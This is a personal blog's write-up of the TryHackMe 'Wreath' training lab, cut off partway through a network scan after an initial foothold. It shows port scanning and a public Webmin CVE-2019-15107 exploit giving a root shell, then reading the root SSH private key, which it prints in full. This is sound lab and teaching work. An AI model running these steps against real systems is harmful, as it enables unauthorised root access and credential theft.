<!DOCTYPE html>  
<html lang=""><link rel="stylesheet" href="../../css/style.css" type="text/css" media="all" />  

<meta property="og:locale" content="en_US">
<meta property="og:type" content="article">
<meta property="og:title" content="THM Wreath Writeup &middot; Gabe Roberts Blog">
<meta property="og:description" content="THM &amp;amp;ldquo;Wreath&amp;amp;rdquo; Write Up Wreath was a multi-machine network comprised of windows and linux machines focused on the concept of pivoting. There was a lot of other great tidbits in there as well like basic obsfucation and AV bypass, as well as compiling your own tools. Overall, I learned a lot here!
Initial Enumeration We have an initial IP to go off of so lets go ahead and throw nmap at it.">
<meta property="og:url" content="https://contactroberts.com/blog/07-08-thm-wreath/">
<meta property="og:site_name" content="Gabe Roberts Blog">
<meta property="og:image" content="">
<meta property="og:image:secure_url" content="">



<meta property="article:published_time" content="2023-07-08T00:00:00Z">

<body><header>  
    <nav class="navbar" role="navigation">  
        <div class="navbar__left">  
            <a href="../../">Gabe Roberts</a>  
        </div>  
        <div class="">  
            <a href="../../blog">Blogs</a>  
            <span class ="nav-item navbar-text mx-1">&emsp;/&emsp;</span>
            <a href="../../tags/">Tags</a>  
            <span class ="nav-item navbar-text mx-1">&emsp;/&emsp;</span>
            <a href="../../pages/">Other</a>  
        </div>  
    </nav>  
</header>  
<main>  
<section class="section">  
  <article>  
    <div class="blog__container">  
          <h1 class="blog__title">THM Wreath Writeup</h1>  

          <p> You get a pivot, and you get a pivot. </p>
          <p>Published: July 8, 2023</p>
          <p>Reading Time: 16  minutes <p>

            <div class="blog__details">  
              <div class="blog__info">  
              </div>  
            </div>  
          <div class="content">  
            <h1 id="thm-wreath-write-up">THM &ldquo;Wreath&rdquo; Write Up</h1>
<p>Wreath was a multi-machine network comprised of windows and linux machines focused on the concept of pivoting. There was a lot of other great tidbits in there as well like basic obsfucation and AV bypass, as well as compiling your own tools. Overall, I learned a lot here!</p>
<h2 id="initial-enumeration">Initial Enumeration</h2>
<p>We have an initial IP to go off of so lets go ahead and throw nmap at it.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 1</span><span><span style="color:#fe8019">[</span>~/thm/wreath<span style="color:#fe8019">]</span>$ nmap -sC -sV -p- -oA wreath1 10.200.84.200
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 2</span><span>Starting Nmap 7.94 <span style="color:#fe8019">(</span> https://nmap.org <span style="color:#fe8019">)</span> at 2023-07-05 21:04 EDT
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 3</span><span>Nmap scan report <span style="color:#fe8019">for</span> 10.200.84.200
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 4</span><span>Host is up <span style="color:#fe8019">(</span>0.11s latency<span style="color:#fe8019">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 5</span><span>Not shown: <span style="color:#d3869b">65382</span> filtered tcp ports <span style="color:#fe8019">(</span>no-response<span style="color:#fe8019">)</span>, <span style="color:#d3869b">148</span> filtered tcp ports <span style="color:#fe8019">(</span>host-unreach<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 6</span><span>PORT      STATE  SERVICE    VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 7</span><span>22/tcp    open   ssh        OpenSSH 8.0 <span style="color:#fe8019">(</span>protocol 2.0<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 8</span><span>| ssh-hostkey:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 9</span><span>|   <span style="color:#d3869b">3072</span> 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e <span style="color:#fe8019">(</span>RSA<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">10</span><span>|   <span style="color:#d3869b">256</span> 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 <span style="color:#fe8019">(</span>ECDSA<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">11</span><span>|_  <span style="color:#d3869b">256</span> f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 <span style="color:#fe8019">(</span>ED25519<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">12</span><span>80/tcp    open   http       Apache httpd 2.4.37 <span style="color:#fe8019">((</span>centos<span style="color:#fe8019">)</span> OpenSSL/1.1.1c<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">13</span><span>|_http-server-header: Apache/2.4.37 <span style="color:#fe8019">(</span>centos<span style="color:#fe8019">)</span> OpenSSL/1.1.1c
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">14</span><span>|_http-title: Did not follow redirect to https://thomaswreath.thm
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">15</span><span>443/tcp   open   ssl/http   Apache httpd 2.4.37 <span style="color:#fe8019">((</span>centos<span style="color:#fe8019">)</span> OpenSSL/1.1.1c<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">16</span><span>|_http-server-header: Apache/2.4.37 <span style="color:#fe8019">(</span>centos<span style="color:#fe8019">)</span> OpenSSL/1.1.1c
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">17</span><span>|_ssl-date: TLS randomness does not represent <span style="color:#fabd2f">time</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">18</span><span>|_http-title: Thomas Wreath | Developer
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">19</span><span>| ssl-cert: Subject: commonName<span style="color:#fe8019">=</span>thomaswreath.thm/organizationName<span style="color:#fe8019">=</span>Thomas Wreath Development/stateOrProvinceName<span style="color:#fe8019">=</span>East Riding Yorkshire/countryName<span style="color:#fe8019">=</span>GB
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">20</span><span>| Not valid before: 2023-07-06T00:45:12
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">21</span><span>|_Not valid after:  2024-07-05T00:45:12
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">22</span><span>| http-methods:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">23</span><span>|_  Potentially risky methods: TRACE
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">24</span><span>| tls-alpn:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">25</span><span>|_  http/1.1
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">26</span><span>9090/tcp  closed zeus-admin
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">27</span><span>10000/tcp open   http       MiniServ 1.890 <span style="color:#fe8019">(</span>Webmin httpd<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">28</span><span>|_http-title: Site doesn&#39;t have a title <span style="color:#fe8019">(</span>text/html; Charset<span style="color:#fe8019">=</span>iso-8859-1<span style="color:#fe8019">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">29</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">30</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">31</span><span>Nmap <span style="color:#fe8019">done</span>: <span style="color:#d3869b">1</span> IP address <span style="color:#fe8019">(</span><span style="color:#d3869b">1</span> host up<span style="color:#fe8019">)</span> scanned in 196.18 seconds
</span></span></code></pre></div><p>From here we have some interesting stuff, notably, a web server, zues-admin, a version of webmin/miniserv.</p>
<p>Long story short, Webmin 1.890 has an <a href="https://github.com/MuirlandOracle/CVE-2019-15107">RCE</a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 1</span><span><span style="color:#fe8019">[</span>~/thm/wreath/CVE-2019-15107<span style="color:#fe8019">]</span>$ ./CVE-2019-15107.py -p <span style="color:#d3869b">10000</span> 10.200.84.200    <span style="color:#fe8019">[</span>main<span style="color:#fe8019">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 3</span><span>        __        __   _               _         ____   ____ _____
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 4</span><span>        <span style="color:#b8bb26">\ \ </span>     / /__| |__  _ __ ___ <span style="color:#fe8019">(</span>_<span style="color:#fe8019">)</span>_ __   |  _ <span style="color:#b8bb26">\ </span>/ ___| ____|
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 5</span><span>         <span style="color:#b8bb26">\ \ </span>/<span style="color:#b8bb26">\ </span>/ / _ <span style="color:#b8bb26">\ </span><span style="color:#b8bb26">&#39;_ \| &#39;</span>_ <span style="color:#b8bb26">`</span> _ <span style="color:#b8bb26">\|</span> | <span style="color:#b8bb26">&#39;_ \  | |_) | |   |  _|
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 6</span><span><span style="color:#b8bb26">          \ V  V /  __/ |_) | | | | | | | | | | |  _ &lt;| |___| |___
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 7</span><span><span style="color:#b8bb26">           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 8</span><span><span style="color:#b8bb26">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 9</span><span><span style="color:#b8bb26">                                                @MuirlandOracle
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">10</span><span><span style="color:#b8bb26">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">11</span><span><span style="color:#b8bb26">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">12</span><span><span style="color:#b8bb26">[*] Server is running in SSL mode. Switching to HTTPS
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">13</span><span><span style="color:#b8bb26">[+] Connected to https://10.200.84.200:10000/ successfully.
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">14</span><span><span style="color:#b8bb26">[+] Server version (1.890) should be vulnerable!
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">15</span><span><span style="color:#b8bb26">[+] Benign Payload executed!
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">16</span><span><span style="color:#b8bb26">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">17</span><span><span style="color:#b8bb26">[+] The target is vulnerable and a pseudoshell has been obtained.
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">18</span><span><span style="color:#b8bb26">Type commands to have them executed on the target.
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">19</span><span><span style="color:#b8bb26">[*] Type &#39;</span>exit<span style="color:#b8bb26">&#39; to exit.
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">20</span><span><span style="color:#b8bb26">[*] Type &#39;</span>shell&#39; to obtain a full reverse shell <span style="color:#fe8019">(</span>UNIX only<span style="color:#fe8019">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">21</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">22</span><span><span style="color:#928374;font-style:italic">#</span>
</span></span></code></pre></div><p>The server was running as root!</p>
<p>We even have persistence by cat-ing out /root/.ssh/id_rsa.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 1</span><span>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 2</span><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 3</span><span>NhAAAAAwEAAQAAAYEAs0oHYlnFUHTlbuhePTNoITku4OBH8OxzRN8O3tMrpHqNH3LHaQRE
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 4</span><span>LgAe9qk9dvQA7pJb9V6vfLc+Vm6XLC1JY9Ljou89Cd4AcTJ9OruYZXTDnX0hW1vO5Do1bS
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 5</span><span>jkDDIfoprO37/YkDKxPFqdIYW0UkzA60qzkMHy7n3kLhab7gkV65wHdIwI/v8+SKXlVeeg
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 6</span><span>0+L12BkcSYzVyVUfE6dYxx3BwJSu8PIzLO/XUXXsOGuRRno0dG3XSFdbyiehGQlRIGEMzx
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 7</span><span>hdhWQRry2HlMe7A5dmW/4ag8o+NOhBqygPlrxFKdQMg6rLf8yoraW4mbY7rA7/TiWBi6jR
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 8</span><span>fqFzgeL6W0hRAvvQzsPctAK+ZGyGYWXa4qR4VIEWnYnUHjAosPSLn+o8Q6qtNeZUMeVwzK
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 9</span><span>H9rjFG3tnjfZYvHO66dypaRAF4GfchQusibhJE+vlKnKNpZ3CtgQsdka6oOdu++c1M++Zj
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">10</span><span>z14DJom9/CWDpvnSjRRVTU1Q7w/1MniSHZMjczIrAAAFiMfOUcXHzlHFAAAAB3NzaC1yc2
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">11</span><span>EAAAGBALNKB2JZxVB05W7oXj0zaCE5LuDgR/Dsc0TfDt7TK6R6jR9yx2kERC4AHvapPXb0
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">12</span><span>AO6SW/Ver3y3PlZulywtSWPS46LvPQneAHEyfTq7mGV0w519IVtbzuQ6NW0o5AwyH6Kazt
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">13</span><span>+/2JAysTxanSGFtFJMwOtKs5DB8u595C4Wm+4JFeucB3SMCP7/Pkil5VXnoNPi9dgZHEmM
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">14</span><span>1clVHxOnWMcdwcCUrvDyMyzv11F17DhrkUZ6NHRt10hXW8onoRkJUSBhDM8YXYVkEa8th5
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">15</span><span>THuwOXZlv+GoPKPjToQasoD5a8RSnUDIOqy3/MqK2luJm2O6wO/04lgYuo0X6hc4Hi+ltI
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">16</span><span>UQL70M7D3LQCvmRshmFl2uKkeFSBFp2J1B4wKLD0i5/qPEOqrTXmVDHlcMyh/a4xRt7Z43
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">17</span><span>2WLxzuuncqWkQBeBn3IULrIm4SRPr5SpyjaWdwrYELHZGuqDnbvvnNTPvmY89eAyaJvfwl
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">18</span><span>g6b50o0UVU1NUO8P9TJ4kh2TI3MyKwAAAAMBAAEAAAGAcLPPcn617z6cXxyI6PXgtknI8y
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">19</span><span>lpb8RjLV7+bQnXvFwhTCyNt7Er3rLKxAldDuKRl2a/kb3EmKRj9lcshmOtZ6fQ2sKC3yoD
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">20</span><span>oyS23e3A/b3pnZ1kE5bhtkv0+7qhqBz2D/Q6qSJi0zpaeXMIpWL0GGwRNZdOy2dv+4V9o4
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">21</span><span>8o0/g4JFR/xz6kBQ+UKnzGbjrduXRJUF9wjbePSDFPCL7AquJEwnd0hRfrHYtjEd0L8eeE
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">22</span><span>egYl5S6LDvmDRM+mkCNvI499+evGwsgh641MlKkJwfV6/iOxBQnGyB9vhGVAKYXbIPjrbJ
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">23</span><span>r7Rg3UXvwQF1KYBcjaPh1o9fQoQlsNlcLLYTp1gJAzEXK5bC5jrMdrU85BY5UP+wEUYMbz
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">24</span><span>TNY0be3g7bzoorxjmeM5ujvLkq7IhmpZ9nVXYDSD29+t2JU565CrV4M69qvA9L6ktyta51
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">25</span><span>bA4Rr/l9f+dfnZMrKuOqpyrfXSSZwnKXz22PLBuXiTxvCRuZBbZAgmwqttph9lsKp5AAAA
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">26</span><span>wBMyQsq6e7CHlzMFIeeG254QptEXOAJ6igQ4deCgGzTfwhDSm9j7bYczVi1P1+BLH1pDCQ
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">27</span><span>viAX2kbC4VLQ9PNfiTX+L0vfzETRJbyREI649nuQr70u/9AedZMSuvXOReWlLcPSMR9Hn7
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">28</span><span>bA70kEokZcE9GvviEHL3Um6tMF9LflbjzNzgxxwXd5g1dil8DTBmWuSBuRTb8VPv14SbbW
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">29</span><span>HHVCpSU0M82eSOy1tYy1RbOsh9hzg7hOCqc3gqB+sx8bNWOgAAAMEA1pMhxKkqJXXIRZV6
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">30</span><span>0w9EAU9a94dM/6srBObt3/7Rqkr9sbMOQ3IeSZp59KyHRbZQ1mBZYo+PKVKPE02DBM3yBZ
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">31</span><span>r2u7j326Y4IntQn3pB3nQQMt91jzbSd51sxitnqQQM8cR8le4UPNA0FN9JbssWGxpQKnnv
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">32</span><span>m9kI975gZ/vbG0PZ7WvIs2sUrKg++iBZQmYVs+bj5Tf0CyHO7EST414J2I54t9vlDerAcZ
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">33</span><span>DZwEYbkM7/kXMgDKMIp2cdBMP+VypVAAAAwQDV5v0L5wWZPlzgd54vK8BfN5o5gIuhWOkB
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">34</span><span>2I2RDhVCoyyFH0T4Oqp1asVrpjwWpOd+0rVDT8I6rzS5/VJ8OOYuoQzumEME9rzNyBSiTw
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">35</span><span>YlXRN11U6IKYQMTQgXDcZxTx+KFp8WlHV9NE2g3tHwagVTgIzmNA7EPdENzuxsXFwFH9TY
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">36</span><span>EsDTnTZceDBI6uBFoTQ1nIMnoyAxOSUC+Rb1TBBSwns/r4AJuA/d+cSp5U0jbfoR0R/8by
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">37</span><span>GbJ7oAQ232an8AAAARcm9vdEB0bS1wcm9kLXNlcnYBAg<span style="color:#fe8019">==</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">38</span><span>-----END OPENSSH PRIVATE KEY-----
</span></span></code></pre></div><h2 id="pivoting">Pivoting</h2>
<p>Since we are already root, no need to privesc and we can look to move further into the network.</p>
<p>After a dive into some pivoting theory, we can put nmap onto the machine and scan the network.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 1</span><span><span style="color:#fe8019">[</span>root@prod-serv ~<span style="color:#fe8019">]</span><span style="color:#928374;font-style:italic"># ./nmap -sn 10.200.84.0/24</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 3</span><span>Starting Nmap 6.49BETA1 <span style="color:#fe8019">(</span> http://nmap.org <span style="color:#fe8019">)</span> at 2023-07-06 22:09 BST
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 4</span><span>Cannot find nmap-payloads. UDP payloads are disabled.
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 5</span><span>Nmap scan report <span style="color:#fe8019">for</span> ip-10-200-84-1.eu-west-1.compute.internal <span style="color:#fe8019">(</span>10.200.84.1<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 6</span><span>Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 7</span><span>Host is up <span style="color:#fe8019">(</span>-0.18s latency<span style="color:#fe8019">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 8</span><span>MAC Address: 02:F3:70:5F:3A:E7 <span style="color:#fe8019">(</span>Unknown<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 9</span><span>Nmap scan report <span style="color:#fe8019">for</span> ip-10-200-84-100.eu-west-1.compute.internal <span style="color:#fe8019">(</span>10.200.84.100<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">10</span><span>Host is up <span style="color:#fe8019">(</span>0.00054s latency<span style="color:#fe8019">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">11</span><span>MAC Address: 02:CE:87:99:87:F5 <span style="color:#fe8019">(</span>Unknown<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">12</span><span>Nmap scan report <span style="color:#fe8019">for</span> ip-10-200-84-150.eu-west-1.compute.internal <span style="color:#fe8019">(</span>10.200.84.150<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">13</span><span>Host is up <span style="color:#fe8019">(</span>0.0021s latency<span style="color:#fe8019">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">14</span><span>MAC Address: 02:FE:34:39:76:4D <span style="color:#fe8019">(</span>Unknown<span style="color:#fe8019">)</span>
